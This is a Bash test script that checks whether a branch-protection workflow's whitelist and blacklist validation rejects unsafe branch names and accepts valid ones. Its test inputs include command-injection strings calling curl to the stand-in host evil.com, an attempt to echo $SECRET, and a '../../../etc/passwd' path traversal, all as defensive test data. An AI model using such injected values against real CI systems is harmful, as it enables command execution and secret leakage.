#!/bin/bash
# Test script for branch name validation in setup-branch-protection workflow
# This script tests both the workflow validation logic and the shell script validation logic

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo "=========================================="
echo "Branch Name Validation Test Suite"
echo "=========================================="
echo ""

TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0

# Test function for workflow validation (whitelist approach + Git format)
test_workflow_validation() {
    local branch="$1"
    local expected="$2"
    local description="$3"
    
    ((TOTAL_TESTS++))
    
    # First check: whitelist validation
    if ! printf '%s\n' "$branch" | grep -qE '^[a-zA-Z0-9/_.-]+$'; then
        result="rejected_whitelist"
    # Second check: Git format validation
    elif ! git check-ref-format --branch "$branch" >/dev/null 2>&1; then
        result="rejected_format"
    else
        result="accepted"
    fi
    
    if [ "$result" = "$expected" ] || { [ "$expected" = "rejected" ] && [[ "$result" =~ ^rejected ]]; }; then
        echo -e "${GREEN}✓ PASS${NC}: $description"
        echo "   Input: '$branch' -> $result"
        ((PASSED_TESTS++))
        return 0
    else
        echo -e "${RED}✗ FAIL${NC}: $description"
        echo "   Input: '$branch' expected $expected but got $result"
        ((FAILED_TESTS++))
        return 1
    fi
}

# Test function for shell script validation (comprehensive blacklist + Git format)
test_script_validation() {
    local branch="$1"
    local expected="$2"
    local description="$3"
    
    ((TOTAL_TESTS++))
    
    # First check: blacklist dangerous characters
    if printf '%s\n' "$branch" | grep -qE '[\$`\\;|&<>(){}[:space:]]'; then
        result="rejected_blacklist"
    # Second check: Git format validation
    elif ! git check-ref-format --branch "$branch" >/dev/null 2>&1; then
        result="rejected_format"
    else
        result="accepted"
    fi
    
    if [ "$result" = "$expected" ] || { [ "$expected" = "rejected" ] && [[ "$result" =~ ^rejected ]]; }; then
        echo -e "${GREEN}✓ PASS${NC}: $description"
        echo "   Input: '$branch' -> $result"
        ((PASSED_TESTS++))
        return 0
    else
        echo -e "${RED}✗ FAIL${NC}: $description"
        echo "   Input: '$branch' expected $expected but got $result"
        ((FAILED_TESTS++))
        return 1
    fi
}

echo "=== Testing Command Injection Attempts ==="
echo ""

# Critical attack vectors
# shellcheck disable=SC2016  # Single quotes intentional - testing literal attack patterns
test_workflow_validation 'main$(curl http://evil.com)' "rejected" "Command substitution with \$()"
# shellcheck disable=SC2016  # Single quotes intentional - testing literal attack patterns
test_workflow_validation 'main`curl http://evil.com`' "rejected" "Command substitution with backticks"
test_workflow_validation 'main; curl http://evil.com' "rejected" "Semicolon command separator"
# shellcheck disable=SC2016  # Single quotes intentional - testing literal attack patterns
test_workflow_validation 'main && echo $SECRET' "rejected" "AND command separator"
test_workflow_validation 'main|curl evil.com' "rejected" "Pipe command separator"
test_workflow_validation 'main&background' "rejected" "Background execution"
test_workflow_validation 'main<redirect' "rejected" "Input redirection"
test_workflow_validation 'main>redirect' "rejected" "Output redirection"
test_workflow_validation 'main(test)' "rejected" "Parentheses subshell"
test_workflow_validation 'main{test}' "rejected" "Braces expansion"

echo ""
# shellcheck disable=SC2016  # Single quotes intentional - testing literal attack patterns
test_script_validation 'main$(curl http://evil.com)' "rejected" "Shell script: Command substitution with \$()"
# shellcheck disable=SC2016  # Single quotes intentional - testing literal attack patterns
test_script_validation 'main`curl http://evil.com`' "rejected" "Shell script: Command substitution with backticks"
test_script_validation 'main; curl http://evil.com' "rejected" "Shell script: Semicolon command separator"
# shellcheck disable=SC2016  # Single quotes intentional - testing literal attack patterns
test_script_validation 'main && echo $SECRET' "rejected" "Shell script: AND command separator"
test_script_validation 'main|curl evil.com' "rejected" "Shell script: Pipe command separator"

echo ""
echo "=== Testing Additional Security Checks ==="
echo ""

test_workflow_validation '../../../etc/passwd' "rejected" "Path traversal attempt"
test_workflow_validation 'branch with spaces' "rejected" "Spaces in branch name"
test_workflow_validation 'branch~1' "rejected" "Tilde character"
test_workflow_validation 'branch^' "rejected" "Caret character"
test_workflow_validation 'branch?' "rejected" "Question mark"
test_workflow_validation 'branch*' "rejected" "Asterisk wildcard"
test_workflow_validation 'branch[' "rejected" "Square bracket"
test_workflow_validation '' "rejected" "Empty string"

echo ""
test_script_validation 'branch with spaces' "rejected" "Shell script: Spaces in branch name"
test_script_validation 'branch\ttab' "rejected" "Shell script: Tab character"
test_script_validation $'branch\nwith\nnewlines' "rejected" "Shell script: Newline characters"

echo ""
echo "=== Testing Valid Branch Names ==="
echo ""

test_workflow_validation 'main' "accepted" "Simple branch name: main"
test_workflow_validation 'develop' "accepted" "Simple branch name: develop"
test_workflow_validation 'master' "accepted" "Simple branch name: master"
test_workflow_validation 'feature/test-branch' "accepted" "Feature branch with slash"
test_workflow_validation 'feature/PROJ-123' "accepted" "Feature branch with ticket ID"
test_workflow_validation 'release/v1.0.0' "accepted" "Release branch with version"
test_workflow_validation 'release/2.0.0-beta.1' "accepted" "Release branch with pre-release version"
test_workflow_validation 'hotfix/bug-456' "accepted" "Hotfix branch"
test_workflow_validation 'bugfix/issue-789' "accepted" "Bugfix branch"
test_workflow_validation 'feat/test_feature' "accepted" "Feature branch with underscore"

echo ""
test_script_validation 'main' "accepted" "Shell script: Simple branch name: main"
test_script_validation 'develop' "accepted" "Shell script: Simple branch name: develop"
test_script_validation 'feature/test-branch' "accepted" "Shell script: Feature branch with slash"
test_script_validation 'release/v1.0.0' "accepted" "Shell script: Release branch with version"

echo ""
echo "=== Testing Edge Cases ==="
echo ""

test_workflow_validation '1234567890' "accepted" "All numeric branch name"
test_workflow_validation 'UPPERCASE' "accepted" "All uppercase branch name"
test_workflow_validation 'lowercase' "accepted" "All lowercase branch name"
test_workflow_validation 'MixedCase123' "accepted" "Mixed case with numbers"
test_workflow_validation 'feature/very-long-branch-name-with-many-dashes-and-numbers-123456789' "accepted" "Very long branch name"
test_workflow_validation 'a' "accepted" "Single character branch name"
test_workflow_validation 'a/b/c/d/e/f' "accepted" "Multiple nested slashes"
test_workflow_validation 'branch.with.dots' "accepted" "Branch name with dots"
test_workflow_validation 'branch-with-dashes' "accepted" "Branch name with dashes"
test_workflow_validation 'branch_with_underscores' "accepted" "Branch name with underscores"

echo ""
echo "=========================================="
echo "Test Results Summary"
echo "=========================================="
echo -e "Total tests:  ${YELLOW}$TOTAL_TESTS${NC}"
echo -e "Passed:       ${GREEN}$PASSED_TESTS${NC}"
echo -e "Failed:       ${RED}$FAILED_TESTS${NC}"
echo ""

if [ $FAILED_TESTS -eq 0 ]; then
    echo -e "${GREEN}✅ All tests passed!${NC}"
    echo ""
    echo "Summary:"
    echo "- All command injection attempts are blocked"
    echo "- All security checks passed"
    echo "- All valid branch names are accepted"
    echo "- Edge cases handled correctly"
    exit 0
else
    echo -e "${RED}❌ Some tests failed!${NC}"
    exit 1
fi
